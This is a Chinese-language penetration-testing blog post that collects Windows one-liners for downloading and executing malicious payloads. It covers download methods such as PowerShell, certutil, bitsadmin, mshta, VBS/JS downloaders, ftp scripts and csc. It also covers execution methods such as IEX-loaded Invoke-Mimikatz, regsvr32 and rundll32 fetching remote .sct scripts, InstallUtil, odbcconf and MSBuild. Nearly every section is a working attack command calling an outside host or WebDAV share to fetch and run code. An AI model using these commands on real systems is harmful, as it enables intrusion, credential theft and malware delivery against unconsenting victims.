---
layout:     post
title:      "Windows上传并执行恶意代码的N种姿势"
subtitle:   "Tricks Collection"
date:       2017-12-28
author:     "Urahara"
header-img: "img/985b529ed039ca38db9b6fbeddd6dfa7.jpg"
header-mask: 0.3
catalog:    true 
tags: 
    - 渗透测试
    - Windows

---

### 简介

在各种钓鱼、挖矿、勒索、组建僵尸网络、基础渗透攻击当中，攻击者都会通过一些方法去下载执行恶意代码并执行完成攻击操作，比如前段时间通过Office DDE执行powershell的，利用宏执行VBS的，绕过权限限制完成危险命令执行的等等，都需要用到文件下载/上传姿势，一般说按照途径可以分为：

1. 通过HTTP、FTP URL进行传输类
2. 通过UNC进行传输类
3. 通过磁盘写入类

而payload执行则具体可以分为**有文件类**和**无文件类**，具体分的话就是**内存执行、本地缓存、磁盘文件**

通过HTTP下载的对象的本地缓存将是IE本地缓存，在以下位置：

- *C:\Users\<username>\AppData\Local\Microsoft\Windows\Temporary Internet Files*
- *C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCache\IE\<subdir>*

通过指向WebDAV服务器的UNC路径访问的文件将被保存在WebDAV客户机本地缓存中：

- *C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV*

下面我们会总结一些下载和执行的方法，大家可以根据不同的环境和场景选择使用，当然我会不断地收集各种姿势来更新本文以求更为全面。

### 下载方法

#### Powershell

powershell是最著名的一种方法了，一般的文件下载命令如下

```powershell
powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://reverse-tcp.xyz/test.exe','C:\test.exe')
powershell (Invoke-WebRequest http://reverse-tcp.xyz/test.jpg -O test.jpg)
```

当然也可以从UVC读取

```powershell
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

#### CScript/WScript

首先就是执行UNC路径下的文件

```
cscript //E:jscript \\webdavserver\folder\payload.txt
```

其次就是通过echo写入vbs脚本，再通过cscript来执行

```
  ● echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open ^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >> c:\windows\temp\d.vbs
  ● C:\Users\Administrator>cscript c:\d.vbs http://reverse-tcp.xyz/443.exe c:\443.exe
```

#### Bitsadmin

[bitsadmin](https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx)是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。不支持https、ftp协议

```powershell
bitsadmin /TRANSFER /DOWNLOAD http://download.sysinternals.com/files/PSTools.zip  E:\PSTools.zip
bitsadmin /TRANSFER /DOWNLOAD \\webdavserver\folder\payload.ps1  E:\payload.ps1
bitsadmin /TRANSFER /UPLOAD E:\payload.ps1 \\webdavserver\folder\payload.ps1
```

#### Certutil

Certutil是一个命令行程序，它是作为证书服务的一部分安装的。可以使用Certutil转储并显示证书颁发机构(CA)配置信息、配置证书服务、备份和恢复CA组件，并验证证书、密钥对和证书链。

```powershell
certutil -urlcache -split -f http://reverse-tcp.xyz/payload payload
```

#### debug

Windows debug 是一个系统自带的程序调试工具，他有一个功能可以将十六进制转化为可执行文件，所以我们的思路就是将需要上传的可执行文件转化成hex文件，通过echo命令写入目标系统中，最后通过debug将hex还原成可执行文件，这一部分具体步骤可参考我之前的一篇[文章](http://reverse-tcp.xyz/2017/05/27/Some-Ways-To-Create-An-Interactive-Shell-On-Windows/)

#### Mshta

Mshta实际上是一个与cscript/wscript相似，但是它具有执行内联脚本的能力，它将下载并执行一个脚本作为有效负载:

```
mshta vbscript:Close(Execute("GetObject(""script:http://reverse-tcp.xyz/payload.sct"")"))
```

mshta接受URL作为一个参数来执行HTA

```
mshta http://reverse-tcp.xyz/payload.hta
mshta \\webdavserver\folder\payload.hta
```

#### FTP

ftp也是一种比较经典的方法，核心就是通过ftp -s:filename.txt去执行filename里边的ftp命令

```
echoopen192.168.1.123 21> ftp.txt
echoftp>> ftp.txt
echobin >> ftp.txt
echoftp>> ftp.txt
echoGET ssss2.exe >> ftp.txt
ftp-s:ftp.txt
```

#### CSC

csc.exe是微软.NET Framework 中的C#编译器，Windows系统中默认包含，可在命令行下将cs文件编译成exe

当然思路还是将cs文件echo写入目标系统

```
echo using System.Net;class WebDL { static void Main(string[] args){System.Net.WebClient client = new WebClient();client.DownloadFile(args[0],args[1]);}} > c:\windows\temp\dl.cs
```

然后调用csc.exe编译cs文件并执行

```
c:\windows\microsoft.net\framework\v3.5\csc /out:c:\windows\temp\dl.exe c:\windws\temp\dl.cs
c:\windows\temp\dl.exe http://reverse-tcp.xyz/svhost.exe c:\windows\temp\svhost.exe
```

#### JScript

以下就是一个js的downloader，和vbs的一样可以直接echo写入服务器执行

```
varObject = WScript.CreateObject("MSXML2.XMLHTTP");Object.open("GET","http://reverse-tcp.xyz/test.exe",false);Object.send();if(Object.Status == 200){varStream = WScript.CreateObject("ADODB.Stream");Stream.Open();Stream.Type = 1;Stream.Write(Object.ResponseBody);Stream.SaveToFile("E:\\test\\ssss2.exe", 2);Stream.Close();}
```

也可以配合rundll32一句话完成下载

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();Object=new%20ActiveXObject("Microsoft.XMLHTTP");Object.open("GET","http://reverse-tcp.xyz/test.exe",false);Object.send();if(Object.Status==200){Stream=new%20ActiveXObject("ADODB.Stream");Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile("E:\\test\\ssss2.exe",2);Stream.Close();}
```

#### CURL

Windows本身是没有curl的，但是在一些其他软件当中会集成curl.exe，比如说Cmder当中，如果在渗透过程当中遇到了Cmder，那就完全可以通过curl来完成下载操作。

### 执行方法

#### Powershell

对于某些无文件渗透场景，powershell可以直接加载到内存执行是很常见的

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.c
om/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
powershell -exec bypass -c "iwr https://gist.githubusercontent.com/Urahara3389/d83b6f9cce
df9aa53f70d987360dbc0e/raw/53ad790f87e0fd2c9449d5359358cd251c39297a/calc.ps1|iex"
```

#### InstallUtil

```
x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.exe
```

当然可以结合其他命令使用，比如Certutil

```
certutil -urlcache -split -f http://reverse-tcp.xyz/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```

#### Regsvcs/Regasm

[*Regsvcs*.exe(.NET 服务安装工具)](http://www.baidu.com/link?url=LFHRhAw_0WiFLLLsGtUuU76QX8dVcoSTNemnWDG-M0aO1bzkPOxXN7R9hJf7H8Z4nU7Vs1szBPOVXixckoa7fK) 、 [*Regasm*.exe(程序集注册工具)](http://www.baidu.com/link?url=mXPdwra2bsMnRy5OfhVIkzJC9bLa7D_qoZFmIFG8oJZNX81nO7BWpgNNGDoks-MpfbmV2k2JIuwgfkejVnF2Sy6Q9DtnhdLoRszgvJhHefi)

```
x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll

x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
```

#### Regsvr32

执行本地脚本

```
regsvr32.exe /s /u /i:file.sct scrobj.dll
```

加载远程脚本执行

```
regsvr32.exe /s /u /i:http://reverse-tcp.xyz/file.sct scrobj.dll
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```

#### Rundll32

rundll32就很熟悉了，主要用于在内存中运行dll文件，它们会在应用程序中被使用

```
rundll32 AllTheThings.dll,EntryPoint
rundll32 javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://reverse-tcp.xyz/payload.sct");window.close();
```

#### Odbcconf

这个和regsvr32很类似。它可以执行一个显示特定函数的DLL。需要注意的是他不一定需要.dll的后缀名文件。

```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```

#### Trusted Developer Utilities

这里比如说MSBuild.exe，它引入一种新的基于 XML 的项目文件格式，这种格式容易理解、易于扩展并且完全受 Microsoft 支持。MSBuild 项目文件的格式使开发人员能够充分描述哪些项需要生成，以及如何利用不同的平台和配置生成这些项。MSBuild 编译后生成的是.exe

```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe File.csproj
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```

### 参考

- 乌云drops 三好学生《渗透技巧——通过cmd上传文件的N种方法 | WooYun知识库》
- https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/amp/